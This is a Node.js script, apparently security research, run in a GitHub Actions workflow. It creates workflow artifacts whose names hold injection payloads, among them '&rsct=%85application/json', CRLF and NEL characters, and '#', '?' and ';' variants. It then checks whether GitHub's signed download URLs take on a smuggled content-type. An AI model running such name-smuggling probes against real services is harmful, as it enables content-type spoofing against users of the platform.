import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY;
const runId=process.env.GITHUB_RUN_ID;
const token=process.env.GITHUB_TOKEN;
const sha=b=>createHash('sha256').update(b).digest('hex');

function req(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);const mod=target.protocol==='https:'?https:http;
    const r=mod.request(target,{method,headers,timeout:20000},res=>{
      const chunks=[];res.on('data',c=>chunks.push(c));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));
    });
    r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));
    if(body)r.write(body);r.end();
  });
}
async function upload(url,bytes){await new BlobClient(url).getBlockBlobClient().uploadData(bytes,{blobHTTPHeaders:{blobContentType:'application/json'}});}
async function inspect(name){
  const nameHex=Buffer.from(name,'utf8').toString('hex');
  try{
    const created=await client.CreateArtifact({...ids,name,version:7,mimeType:StringValue.create({value:'application/json'})});
    const rec={name:nameHex,createOk:!!created.ok};
    if(!created.ok)return rec;
    const placeholder=Buffer.from('{}');
    await upload(created.signedUploadUrl,placeholder);
    const fin=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
    rec.finalOk=!!fin.ok;rec.id=String(fin.artifactId||'');
    if(!fin.ok)return rec;
    // GetSignedArtifactURL by name
    try{const s=await client.GetSignedArtifactURL({...ids,name});const u=new URL(s.signedUrl);rec.nameRsct=u.searchParams.get('rsct');rec.nameUrlRaw=u.search;}catch(e){rec.nameErr=String(e).slice(0,120);}
    const r=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${rec.id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'repo-cassette-nameprobe'});
    rec.restStatus=r.status;rec.location=r.headers.location||null;
    if(r.headers.location){
      try{const u=new URL(r.headers.location);rec.rsct=u.searchParams.get('rsct');rec.query=u.search;}catch(e){rec.urlErr=String(e).slice(0,120);}
      const f=await req(r.headers.location);
      const cts=[];for(let i=0;i<f.rawHeaders.length;i+=2)if(f.rawHeaders[i].toLowerCase()==='content-type')cts.push(Buffer.from(f.rawHeaders[i+1],'latin1').toString('hex'));
      rec.finalStatus=f.status;rec.finalCts=cts;rec.bodyLength=f.body.length;
    }
    return rec;
  }catch(e){return {name:nameHex,error:String(e.message||e).slice(0,180)};}
}
const names=[
  `amp-${runId}-A&rsct=%85application/json&z=`,
  `amp2-${runId}-B&rsct=application/json&z=`,
  `pct-${runId}-C%85`,
  `pct2-${runId}-D%2585`,
  `quote-${runId}-E"&rsct=%85application/json&x="`,
  `hash-${runId}-F#rsct=%85`,
  `quest-${runId}-G?rsct=%85`,
  `semi-${runId}-H;rsct=%85`,
  `space-${runId}-I rsct=%85`,
  `crlf-${runId}-J%0D%0A`,
  `nel-${runId}-K\u0085`,
  `slash-${runId}-L/rsct=%85`,
];
for(const n of names){console.log('NAMEPROBE',JSON.stringify(await inspect(n)));}
